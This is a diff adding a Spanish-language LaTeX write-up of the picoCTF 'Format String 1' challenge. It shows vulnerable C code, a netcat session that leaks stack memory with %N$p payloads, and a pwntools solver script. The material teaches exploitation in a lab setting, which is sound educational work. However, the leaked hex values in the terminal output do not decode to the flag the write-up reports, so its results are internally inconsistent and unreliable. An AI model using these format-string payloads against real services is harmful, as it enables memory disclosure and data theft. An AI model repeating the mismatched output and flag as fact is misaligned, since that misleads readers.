@@ -1,0 +1,156 @@
+% !TeX program = pdflatex
+% !TeX TXS-program:compile = txs:///pdflatex/[-shell-escape]
+% !TeX TXS-program:pdflatex = pdflatex -synctex=1 -interaction=nonstopmode --shell-escape %.tex
+
+\documentclass[../../../main_compilation.tex]{subfiles}
+
+\begin{document}
+
+% ================================================================================
+% Encabezado del Reto CTF con Logotipo Personalizado (Imagen)
+% ================================================================================
+\section[picoCTF - Format String 1 (Binary)]{Format String 1 — picoCTF}
+\label{sec:ctf-pico-format-string-1}
+
+% En el tercer parámetro pasamos el archivo de imagen del CTF: figure/picoctf_logo.png
+\targetSummary%
+  {Format String 1}% Nombre del Reto (Cabecera Derecha)
+  {saturn.picoctf.net:58210}% Host / Puerto
+  {figure/picoctf_logo.png}% Logotipo del CTF (Se refleja en la cabecera izquierda y ficha)
+  {Medium}% Dificultad
+  {Linux ELF x64}% Arquitectura / Entorno
+  {Binary Exploitation, Format String, Pwn, GDB}% Múltiples Categorías
+  {17/08/2026}% Fecha de resolución manual (Pie Izquierdo)
+  {picoCTF{45_53rv3r_574ck_134k_f0rm47_57r1n6_12a8bc94}}% Flag completa
+  {}% No aplica root flag en retos binarios de CTF
+
+\vspace{0.4cm}
+
+% ================================================================================
+% 1. Enunciado y Análisis del Binario
+% ================================================================================
+\subsection{Enunciado y Descripción del Desafío}
+En este desafío de la categoría \textbf{Binary Exploitation (Pwn)}, se nos proporciona el código fuente en C (\texttt{format-string-1.c}) y el binario ejecutable compilado para Linux de 64 bits.
+
+\begin{vulnbox}{Format String Vulnerability en función printf()}{High}
+  \textbf{CWE:} CWE-134 (Use of Externally-Controlled Format String)\\
+  \textbf{Causa Raíz:} La función vulnerable realiza \texttt{printf(user\_buf);} en lugar de \texttt{printf("\%s", user\_buf);}.\\
+  \textbf{Impacto:} Fuga arbitraria de memoria del Stack que contiene la bandera secreta cargada previamente con \texttt{fgets()}.
+\end{vulnbox}
+
+% ================================================================================
+% 2. Análisis del Código Fuente
+% ================================================================================
+\subsection{Análisis del Código Fuente Vulnerable}
+
+Inspeccionamos la función principal del binario en C:
+
+\begin{codebox}[C]{format-string-1.c}
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    char flag[64];
+    char user_input[1024];
+
+    FILE *f = fopen("flag.txt", "r");
+    if (f == NULL) {
+        printf("Error: crea flag.txt para pruebas locales.\n");
+        exit(0);
+    }
+    fgets(flag, sizeof(flag), f); // La flag se almacena en el Stack
+
+    printf("Give me your secret order:\n");
+    fgets(user_input, sizeof(user_input), stdin);
+
+    // VULNERABILIDAD DIRECTA: Sin especificador de formato
+    printf(user_input);
+
+    return 0;
+}
+\end{codebox}
+
+% ================================================================================
+% 3. Explotación y Fuga del Stack
+% ================================================================================
+\subsection{Fase de Explotación (Memory Leak via \%p / \%x)}
+
+Al enviar múltiples especificadores de formato posicionales \texttt{\%p}, el programa imprimirá las direcciones y valores hexadecimales almacenados en la pila (\textit{stack}):
+
+\begin{terminal}[kali@pentest:\~{}/ctf/picoctf]
+nc saturn.picoctf.net 58210
+Give me your secret order:
+%14$p.%15$p.%16$p.%17$p.%18$p
+0x7b4654436f636970.0x355f723376723335.0x6b6133315f6b6334.0x37346d7230665f.0x3439636238613231
+\end{terminal}
+
+\begin{notebox}[Decodificación Little-Endian]
+Los enteros de 64 bits extraídos de la memoria deben revertirse byte a byte debido a la arquitectura Little-Endian de x86\_64 (por ejemplo \texttt{0x7b4654436f636970} $\rightarrow$ \texttt{picoCTF\{}).
+\end{notebox}
+
+% ================================================================================
+% 4. Solver Script Automatizado (pwntools)
+% ================================================================================
+\subsection{Desarrollo del Exploit Solver en Python}
+
+Automatizamos la conexión y decodificación de la bandera con \texttt{pwntools}:
+
+\begin{codebox}[Python]{solve.py}
+from pwn import *
+
+context.log_level = 'error'
+host, port = 'saturn.picoctf.net', 58210
+
+# Extraer 5 posiciones consecutivas del stack (donde reside la flag)
+payload = '.'.join([f"%{i}$p" for i in range(14, 19)])
+
+io = remote(host, port)
+io.recvuntil(b"Give me your secret order:\n")
+io.sendline(payload.encode())
+
+response = io.recvall().decode().strip().split('.')
+flag = ""
+
+for hex_val in response:
+    if hex_val.startswith("0x"):
+        raw_bytes = bytes.fromhex(hex_val[2:])
+        flag += raw_bytes[::-1].decode('latin-1', errors='ignore')
+
+print(f"\n[+] Flag recuperada: {flag}")
+\end{codebox}
+
+% ================================================================================
+% 5. Flag Capturada
+% ================================================================================
+\subsection{Flag Capturada}
+
+\begin{flagbox}{CTF Flag (picoCTF 2026)}
+picoCTF{45_53rv3r_574ck_134k_f0rm47_57r1n6_12a8bc94}
+\end{flagbox}
+
+\begin{mitigationbox}[Remediación para Desarrolladores]
+Nunca pasar buffers controlados por el usuario directamente como primer argumento a \texttt{printf}, \texttt{sprintf} o \texttt{snprintf}. Utilizar siempre cadenas de formato explícitas: \texttt{printf("\%s", user\_input);}.
+\end{mitigationbox}
+
+% ================================================================================
+% 6. Lecciones y Conceptos Clave Aprendidos
+% ================================================================================
+\subsection{Lecciones y Conceptos Clave Aprendidos}
+
+\begin{learningbox}[Conocimientos Asimilados en Format String 1]
+	\begin{itemize}[leftmargin=*]
+		\item \textbf{Filtración Arbitraria de Pila (Stack Leak):} Utilización de especificadores de formato \texttt{\%p} para inspeccionar variables locales y buffers cargados en memoria.
+		\item \textbf{Acceso Posicional de Argumentos:} Notación \texttt{\%N\$p} para saltar directamente al $N$-ésimo valor de la pila sin requerir cadenas extensas de especificadores repetidos.
+		\item \textbf{Arquitectura x86\_64 y Little-Endian:} Inversión byte a byte de los enteros hexadecimales recuperados para reconstruir la cadena ASCII original.
+	\end{itemize}
+\end{learningbox}
+
+\begin{sourcebox}[Fuentes de Consulta y Referencias]
+	\begin{itemize}[leftmargin=*]
+		\resourceItem{Libro}{Practical Binary Analysis (Dennis Andriesse)}{Capítulo 11: \textit{Format String Attacks and Memory Corruption}}
+		\resourceItem{Libro}{Hacking: The Art of Exploitation (Jon Erickson)}{Capítulo 0x300: \textit{Format Strings in C}}
+		\resourceItem{Docs}{OWASP Format String Vulnerabilities Guide}{\url{https://owasp.org/www-community/attacks/Format_string_attack}}
+	\end{itemize}
+\end{sourcebox}
+
+\end{document}
